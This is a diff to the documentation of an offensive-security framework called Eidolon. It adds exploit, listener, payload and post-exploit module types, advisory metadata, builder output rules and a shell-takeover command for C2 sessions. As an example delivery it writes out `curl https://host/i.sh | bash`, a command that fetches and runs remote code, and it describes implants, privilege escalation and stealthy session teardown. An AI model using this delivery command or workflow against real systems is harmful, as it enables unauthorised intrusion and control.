@@ -120,8 +120,11 @@ NAME        = "hello-probe"            # optional metadata
 VERSION     = "1.0.0"
 DESCRIPTION = "Greets a host and reports latency."
 CATEGORY    = "recon"
-MODULE_TYPE = "auxiliary"              # exploit | auxiliary | generic
+MODULE_TYPE = "auxiliary"              # exploit | listener | payload | post-exploit | auxiliary | generic
 AUTHOR      = "you"
+RANK        = "normal"                 # advisory quality grade (see below)
+TARGETS     = []                       # advisory: what this applies to
+REFERENCES  = []                       # advisory: CVE ids / writeups / vendor notes
 REQUIREMENTS = ["httpx"]               # shown by `deps`, never installed
 
 OPTIONS = {
@@ -144,9 +147,35 @@ def run(opts):
 
 - `OPTIONS` drives the CLI: `set`, `options`, tab completion, and required-value
   validation are all generated from it.
-- `MODULE_TYPE` separates weapons (`exploit`) from tooling (`auxiliary`, `generic`).
+- `MODULE_TYPE` separates the cast: `exploit` (the break-in), `post-exploit`
+  (recon, escalation, and the interactive takeover via a `shell()` handler),
+  `listener` + `payload` (the C2 halves), and tooling (`auxiliary`, `generic`).
 - `REQUIREMENTS` is declarative only — `deps` prints `pip install httpx`; nothing
   is ever auto-installed.
+
+### Advisory metadata — RANK / TARGETS / REFERENCES
+
+Three optional module-level fields carry *advisory* knowledge. The framework
+never enforces any of them — they exist so an operator can judge a module in
+one glance and so remote repositories can carry reputation instead of binaries:
+
+```python
+RANK        = "great"    # excellent > great > good > normal > average > low > manual
+TARGETS     = ["linux/x86_64", "nginx 1.18-1.20", "windows/x64 == 10 build 19041"]
+REFERENCES  = ["CVE-2021-44228", "https://attackerkb.com/..."]
+```
+
+- **`RANK`** — the author's quality grade, Mir-model vocabulary (excellent →
+  manual). `info`, `repo list-modules -s`, and `repo info` render it color-coded;
+  remote indexes may add a `"rank"` key per module and it displays the same way.
+- **`TARGETS`** — a free-form list of what the technique applies to: platform/
+  arch, service with version range, kernel build, network range. Advisory only —
+  the module stays authoritative about what it will actually do.
+- **`REFERENCES`** — CVE ids, advisories, writeups. Displayed by `info` and
+  `repo info`; a module without references is fine, a module *with* them is
+  easier to trust.
+
+All three fall back gracefully: untouched, they simply never appear.
 
 ### Writing modules locally
 
@@ -155,8 +184,10 @@ Eidolon ❯ new_module my_probe ~/code
 ```
 
 scaffolds a fully documented skeleton (metadata, options, run, docstring guidance),
-ready to fill in. Drop any file straight in with `add_module <src> [dest] [--force]`
-or `install_local`.
+ready to fill in — pick the type on the command line (`exploit`, `listener`,
+`payload`, `post-exploit`, `auxiliary`, `generic`) or answer the interactive
+menu; with `--fa` the scaffold and its embedded guidance are Persian. Drop any
+file straight in with `add_module <src> [dest] [--force]` or `install_local`.
 
 ### Payload channels (exploit modules)
 
@@ -199,6 +230,22 @@ path always passes (freedom) and arrives typed `"external"`. Under the hood this
 
 Raw operator files (any path) stay first-class: they resolve with type `"external"`
 and the module stays authoritative. Freedom by default, typing when you want it.
+
+### The exploit ↔ payload relationship — external C2s on equal footing
+
+The exploit is a *delivery mechanism*; the payload store is merely one optional
+source among equals. The flexibility story is deliberately manual-first:
+
+- **External C2, zero wiring** — point the module's channels at a Sliver or
+  MSF artifact and the exploit delivers it. No framework involved.
+- **Manual by default** — the operator fills the info page by hand: a file
+  path (absolute or relative, `./payload`), a shell command
+  (`curl https://host/i.sh | bash`), or raw source.
+- **Automation only on command** — a *typed store payload* behaves like one
+  more external deliverable; its single convenience (the manifest dict, type-
+  checked, with the builder's `config` riding along) is granted ONLY when the
+  operator explicitly types `set payload <name>`. The framework never chooses
+  or fetches anything by itself.
 
 ### Multi-file modules
 
@@ -257,6 +304,17 @@ the framework enforces:
   *any* language the author pleases (Go, Nim, C, Rust, C#, bash, python,
   PowerShell…) and registers it in the store — exploits pick it up by name,
   type-filtered.
+- **Artifacts land where YOU work** — a builder writes to an explicit `output`
+  option if you set one, and otherwise to your **current working directory**
+  (open eidolon in `~/HACK/`, build, get `~/HACK/payload.exe`). It is registered
+  with `keep=True`: the file STAYS at the operator's path, the manifest records
+  that absolute location, and nothing is copied into temp or framework dirs.
+  `/tmp`, `/var/tmp`, `/dev/shm` and `%TEMP%` are refused on both sides —
+  registration and `set payload <path>` alike — so no artifact ever silently
+  depends on throwaway staging data.
+- **Async is first-class** — `run()` may be a plain `def` or an `async def`; the
+  framework runs the event loop itself, foreground or as a managed background
+  job. An async listener needs zero thread/loop ceremony of its own.
 - **Typed payload store** — every artifact labeled (file-posix / file-win /
   shellcode / cmd / code) with a SHA-256 manifest
 - **No wire contract** — the kernel never connects anything, so it never enforces
@@ -267,6 +325,16 @@ the framework enforces:
   `use <sid>` (a prefix is enough) makes the console step aside and the module's
   own shell take over — your prompt, your commands, full tab completion. `back`
   returns control; the session may tear itself down for stealth.
+- **Post-exploit modules** — type `post-exploit`: requires initial access and
+  owns everything after the break-in (full recon, privilege escalation) and
+  declares an extra `shell(opts)` handler. The operator runs `shell` with the
+  module selected and the module hands the console to the shell channel it got
+  FROM a listener — raw bash, cmd, PowerShell, any dialect negotiated between
+  the listener and the implant, never imposed by the framework. The scaffold's
+  default picks the session from the kernel registry (`c2 sessions`) and calls
+  its `interact()`; keeping the console in-module with a subshell + full tab
+  completion is equally supported. `run(opts)` and `shell(opts)` are both
+  sync-or-async, first-class.
 
 ### The two-second workflow
 
@@ -297,6 +365,7 @@ target user, host, implant flavor and address.
 | `use <listener module>` · `set` · `run` | the whole listener story — select it, configure it like any module; `run` auto-backgrounds it as a job |
 | `gen <payload module>` | select a builder (GEN MODE — payload/listener selection only) — params via `set`, build + register via `run` |
 | `use <sid>` | enter a live C2 session — the framework resolves the prefix and steps aside; the module's own shell takes over with full tab completion |
+| `shell` | post-exploit takeover — invokes the selected module's `shell(opts)` handler, which hands over the channel negotiated with its listener |
 | `jobs` | background jobs — id · status · uptime |
 | `kill <id>` | clean stop via the module's `stop()` (also automatic on `exit`) |
 | `run --bg` | background ANY module (listener-type modules always run as jobs) |
